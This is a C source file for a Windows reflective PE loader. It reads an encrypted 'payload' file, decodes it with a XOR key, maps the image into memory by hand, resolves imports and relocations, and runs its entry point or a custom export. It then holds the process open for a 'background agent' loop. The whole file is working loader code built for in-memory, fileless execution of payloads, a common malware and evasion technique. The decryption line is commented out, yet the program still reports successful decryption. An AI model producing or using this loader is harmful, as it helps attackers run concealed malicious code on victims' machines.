// cl.exe loader.c
#include <windows.h>
#include <stdio.h>

typedef BOOL(WINAPI* FnDllMain)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
typedef void(WINAPI* FnRunTest)();

// Helper function to read a target disk file into a raw data buffer
PBYTE ReadPayloadFile(const char* filePath, PDWORD pFileSize) {
    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    DWORD size = GetFileSize(hFile, NULL);
    if (size == 0 || size == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return NULL;
    }

    PBYTE buffer = (PBYTE)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) {
        CloseHandle(hFile);
        return NULL;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, buffer, size, &bytesRead, NULL) || bytesRead != size) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return NULL;
    }

    CloseHandle(hFile);
    *pFileSize = size;
    return buffer;
}

PVOID GetLocalProcAddressManual(PBYTE pBase, const char* funcName) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    IMAGE_DATA_DIRECTORY exportDataDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    
    if (exportDataDir.VirtualAddress == 0 || exportDataDir.Size == 0) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + exportDataDir.VirtualAddress);
    DWORD* pNames = (DWORD*)(pBase + pExportDir->AddressOfNames);
    WORD* pOrdinals = (WORD*)(pBase + pExportDir->AddressOfNameOrdinals);
    DWORD* pFunctions = (DWORD*)(pBase + pExportDir->AddressOfFunctions);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        char* currentName = (char*)(pBase + pNames[i]);
        if (strcmp(funcName, currentName) == 0) {
            WORD ordinal = pOrdinals[i];
            return (PVOID)(pBase + pFunctions[ordinal]);
        }
    }
    return NULL;
}

BOOL ResolveImageImports(PBYTE pDestBase, PIMAGE_NT_HEADERS pNtHeaders) {
    IMAGE_DATA_DIRECTORY importDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.VirtualAddress == 0 || importDir.Size == 0) return TRUE; 

    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(pDestBase + importDir.VirtualAddress);

    while (pImportDesc->Name != 0) {
        char* dllName = (char*)(pDestBase + pImportDesc->Name);
        HMODULE hDependency = LoadLibraryA(dllName);
        if (!hDependency) return FALSE;

        PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)(pDestBase + pImportDesc->FirstThunk);
        DWORD lookupThunkRVA = pImportDesc->OriginalFirstThunk ? pImportDesc->OriginalFirstThunk : pImportDesc->FirstThunk;
        PIMAGE_THUNK_DATA pINT = (PIMAGE_THUNK_DATA)(pDestBase + lookupThunkRVA);

        while (pIAT->u1.Function != 0) {
            PVOID pFuncAddress = NULL;

            if (IMAGE_SNAP_BY_ORDINAL(pINT->u1.Ordinal)) {
                WORD ordinal = IMAGE_ORDINAL(pINT->u1.Ordinal);
                pFuncAddress = (PVOID)GetProcAddress(hDependency, (LPCSTR)ordinal);
            } else {
                PIMAGE_IMPORT_BY_NAME pImportName = (PIMAGE_IMPORT_BY_NAME)(pDestBase + pINT->u1.AddressOfData);
                pFuncAddress = (PVOID)GetProcAddress(hDependency, (LPCSTR)pImportName->Name);
            }

            if (!pFuncAddress) return FALSE;

            pIAT->u1.Function = (ULONG_PTR)pFuncAddress;
            pIAT++;
            pINT++;
        }
        pImportDesc++;
    }
    return TRUE;
}

// STEP 3: Granular Section Protection Tuning Engine
void TuneSectionPermissions(PBYTE pDestBase, PIMAGE_NT_HEADERS pNtHeaders) {
    WORD sectionCount = pNtHeaders->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);

    printf("[*] Adjusting mapped section permissions to strict values...\n");

    for (WORD i = 0; i < sectionCount; i++) {
        if (pSection->SizeOfRawData == 0) {
            pSection++;
            continue;
        }

        PVOID pSectionAddress = pDestBase + pSection->VirtualAddress;
        DWORD sectionSize = pSection->SizeOfRawData;
        DWORD newProtect = PAGE_NOACCESS;
        DWORD oldProtect = 0;

        // Map section characteristic flags into exact page permissions
        if (pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (pSection->Characteristics & IMAGE_SCN_MEM_WRITE)
                newProtect = PAGE_EXECUTE_READWRITE;
            else if (pSection->Characteristics & IMAGE_SCN_MEM_READ)
                newProtect = PAGE_EXECUTE_READ;
            else
                newProtect = PAGE_EXECUTE;
        } else {
            if (pSection->Characteristics & IMAGE_SCN_MEM_WRITE)
                newProtect = PAGE_READWRITE;
            else if (pSection->Characteristics & IMAGE_SCN_MEM_READ)
                newProtect = PAGE_READONLY;
        }

        printf("    -> Section: %-8s | Flag: 0x%08X -> Applied Protect: 0x%02X\n", 
               pSection->Name, pSection->Characteristics, newProtect);

        VirtualProtect(pSectionAddress, sectionSize, newProtect, &oldProtect);
        pSection++;
    }
}

// STEP 1: Stream Transformation / Restoration Pipeline
PBYTE RunRestorationPipeline(PBYTE pRawFile, DWORD size, const char* key, DWORD keyLen) {
    printf("[*] Entering Restoration Pipeline phase.\n");
    
    PBYTE pDecryptedBuffer = (PBYTE)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pDecryptedBuffer) return NULL;

    // Apply simple rolling stream translation layer (e.g., repeating XOR key structure)
    for (DWORD i = 0; i < size; i++) {
        //pDecryptedBuffer[i] = pRawFile[i] ^ key[i % keyLen];
        pDecryptedBuffer[i] = pRawFile[i];
    }

    printf("[+] Restoration complete. Stream memory buffer decrypted successfully.\n");
    return pDecryptedBuffer;
}

BOOL ValidateAndMapPE(PBYTE pSourcePayload, DWORD sourceSize) {
    if (!pSourcePayload) return FALSE;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSourcePayload;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSourcePayload + pDosHeader->e_lfanew);

    // Validate signatures now that the restoration engine has normalized the stream
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE || pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] Error: Buffer signature verification failed post-restoration.\n");
        return FALSE;
    }

    // STEP 2: PE Layout Engine
    DWORD imageSize = pNtHeaders->OptionalHeader.SizeOfImage;
    PBYTE pDestBase = (PBYTE)VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pDestBase) return FALSE;

    printf("[+] Base allocated locally at: 0x%p\n", (void*)pDestBase);

    // Map Headers and Sections
    memcpy(pDestBase, pSourcePayload, pNtHeaders->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (pSection[i].SizeOfRawData == 0) continue;
        memcpy(pDestBase + pSection[i].VirtualAddress, pSourcePayload + pSection[i].PointerToRawData, pSection[i].SizeOfRawData);
    }

    // Apply Base Relocations
    ULONG_PTR delta = (ULONG_PTR)pDestBase - pNtHeaders->OptionalHeader.ImageBase;
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY relocDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.VirtualAddress != 0 && relocDir.Size > 0) {
            PIMAGE_BASE_RELOCATION pRelocBlock = (PIMAGE_BASE_RELOCATION)(pDestBase + relocDir.VirtualAddress);
            while (pRelocBlock->VirtualAddress != 0 && pRelocBlock->SizeOfBlock > 0) {
                DWORD entryCount = (pRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD pEntries = (PWORD)((PBYTE)pRelocBlock + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD i = 0; i < entryCount; i++) {
                    WORD type = pEntries[i] >> 12;
                    WORD offset = pEntries[i] & 0x0FFF;
#ifdef _WIN64
                    if (type == IMAGE_REL_BASED_DIR64) *(ULONG_PTR*)(pDestBase + pRelocBlock->VirtualAddress + offset) += delta;
#else
                    if (type == IMAGE_REL_BASED_HIGHLOW) *(DWORD*)(pDestBase + pRelocBlock->VirtualAddress + offset) += (DWORD)delta;
#endif
                }
                pRelocBlock = (PIMAGE_BASE_RELOCATION)((PBYTE)pRelocBlock + pRelocBlock->SizeOfBlock);
            }
        }
    }

    // Resolve IAT Dependencies
    if (!ResolveImageImports(pDestBase, pNtHeaders)) {
        VirtualFree(pDestBase, 0, MEM_RELEASE);
        return FALSE;
    }

    // STEP 3: Tighten Permissions
    TuneSectionPermissions(pDestBase, pNtHeaders);

    // STEP 4: Execution Handoff
    BOOL isDll = (pNtHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL) != 0;
    DWORD entryPointRVA = pNtHeaders->OptionalHeader.AddressOfEntryPoint;
    BOOL initSuccess = FALSE;

    if (isDll && entryPointRVA != 0) {
        FnDllMain DllEntry = (FnDllMain)(pDestBase + entryPointRVA);
        printf("[+] Executing entry point handoff at: 0x%p\n", (void*)DllEntry);
        __try {
            initSuccess = DllEntry((HINSTANCE)pDestBase, DLL_PROCESS_ATTACH, NULL);
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            initSuccess = FALSE;
        }
    }

    // Check for explicit test exports if entry state needs custom validation
    if (!initSuccess && isDll) {
        FnRunTest CustomExport = (FnRunTest)GetLocalProcAddressManual(pDestBase, "voidRunTest");
        if (CustomExport) {
            __try {
                CustomExport();
                initSuccess = TRUE;
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                initSuccess = FALSE;
            }
        }
    }

    return initSuccess;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <path_to_payload>\n", argv[0]);
        return -1;
    }

    DWORD fileSize = 0;
    PBYTE pRawFile = ReadPayloadFile(argv[1], &fileSize);
    if (!pRawFile) return -1;

    // Change definition values here to match your custom research key specifications
    const char* transformationKey = "CRYSTAL"; 
    DWORD keyLength = 7;

    // Run the input data through the parsing pipeline step 1
    PBYTE pNormalizedPayload = RunRestorationPipeline(pRawFile, fileSize, transformationKey, keyLength);
    VirtualFree(pRawFile, 0, MEM_RELEASE); // Drop the encrypted disk footprint raw buffer immediately

    if (!pNormalizedPayload) {
        printf("[-] Pipeline transformation layer failure.\n");
        return -1;
    }

    // Hand over the clean, decrypted buffer to the layout mapping engine
    BOOL success = ValidateAndMapPE(pNormalizedPayload, fileSize);
    VirtualFree(pNormalizedPayload, 0, MEM_RELEASE); // Clean up temporary workspace

    printf("[+] Processing complete. Status: %s\n", success ? "SUCCESS" : "FAILURE");

    if (success) {
        printf("[*] Host engine holding process boundary open.\n");
        printf("[*] Monitoring background agent thread loop... (Press Ctrl+C to exit)\n\n");
        
        // Prevents the primary process thread from exiting and killing the background loop
        Sleep(INFINITE); 
    }

    return 0;
}